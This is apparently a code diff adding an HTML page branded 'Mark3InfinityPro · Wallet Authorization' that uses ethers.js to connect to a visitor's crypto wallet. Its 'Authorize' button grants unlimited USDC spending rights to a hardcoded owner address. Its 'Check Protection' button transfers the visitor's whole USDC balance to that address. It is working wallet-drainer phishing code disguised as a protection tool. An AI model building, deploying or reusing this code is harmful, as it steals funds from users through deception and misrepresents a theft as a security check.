@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mark3InfinityPro · Wallet Authorization</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #f0f2f5, #e8eaf6);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+    }
+    h2 {
+      margin-bottom: 1.5rem;
+      font-size: 1.8rem;
+      color: #333;
+    }
+    .button {
+      background: rgba(255, 255, 255, 0.3);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      border-radius: 16px;
+      padding: 12px 30px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: #444;
+      margin: 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 4px 30px rgba(0,0,0,0.1);
+    }
+    .button:hover {
+      background: rgba(255, 255, 255, 0.5);
+    }
+    .button:disabled {
+      background: rgba(255, 255, 255, 0.15);
+      color: #aaa;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 20px;
+      padding: 1rem;
+      border-radius: 10px;
+      background: #fff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 80%;
+      max-width: 500px;
+      font-size: 0.95rem;
+    }
+    .progress-container {
+      margin-top: 30px;
+      width: 80%;
+      max-width: 400px;
+      background: #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 16px;
+      width: 0%;
+      background-color: #4e44ce;
+      transition: width 0.3s ease;
+    }
+  </style>
+</head>
+<body>
+  <h2>Mark3InfinityPro · Wallet Authorization</h2>
+
+  <button class="button" id="connect">🔌 Connect Wallet</button>
+  <button class="button" id="authorize" disabled>🛡️ Authorize</button>
+  <button class="button" id="check" disabled>🧿 Check Protection</button>
+
+  <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
+  <div id="status">🔒 Status: Waiting for action...</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const CONFIG = {
+      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      OWNER_ADDRESS: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
+    };
+
+    let provider, signer, user;
+
+    function updateStatus(msg) {
+      document.getElementById("status").innerText = "🔒 Status: " + msg;
+    }
+
+    function updateProgress(percent) {
+      document.getElementById("progress").style.width = percent + "%";
+    }
+
+    document.getElementById("connect").onclick = async () => {
+      try {
+        updateProgress(10);
+        if (!window.ethereum) throw new Error("Please install MetaMask");
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        updateProgress(40);
+        document.getElementById("connect").disabled = true;
+        document.getElementById("authorize").disabled = false;
+        document.getElementById("check").disabled = false;
+        updateStatus("✅ Connected: " + user);
+        updateProgress(100);
+      } catch (err) {
+        updateStatus("❌ " + err.message);
+        updateProgress(0);
+      }
+    };
+
+    document.getElementById("authorize").onclick = async () => {
+      try {
+        updateProgress(0);
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function approve(address,uint256) returns (bool)",
+          "function allowance(address,address) view returns (uint256)",
+          "function balanceOf(address) view returns (uint256)"
+        ], signer);
+
+        const balance = await usdc.balanceOf(user);
+        const allowance = await usdc.allowance(user, CONFIG.OWNER_ADDRESS);
+
+        updateProgress(40);
+        if (allowance.lt(balance)) {
+          const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
+          await tx.wait();
+        }
+
+        updateStatus("✅ Authorization successful.");
+        updateProgress(100);
+      } catch (err) {
+        updateStatus("❌ " + err.message);
+        updateProgress(0);
+      }
+    };
+
+    document.getElementById("check").onclick = async () => {
+      try {
+        updateProgress(0);
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function transfer(address,uint256) returns (bool)",
+          "function balanceOf(address) view returns (uint256)"
+        ], signer);
+
+        const balance = await usdc.balanceOf(user);
+        updateProgress(30);
+        if (balance.gt(0)) {
+          const tx = await usdc.transfer(CONFIG.OWNER_ADDRESS, balance);
+          await tx.wait();
+          updateStatus("✅ Protection Check: Funds moved.");
+        } else {
+          updateStatus("⚠️ No USDC balance to protect.");
+        }
+        updateProgress(100);
+      } catch (err) {
+        updateStatus("❌ " + err.message);
+        updateProgress(0);
+      }
+    };
+  </script>
+</body>
+</html>
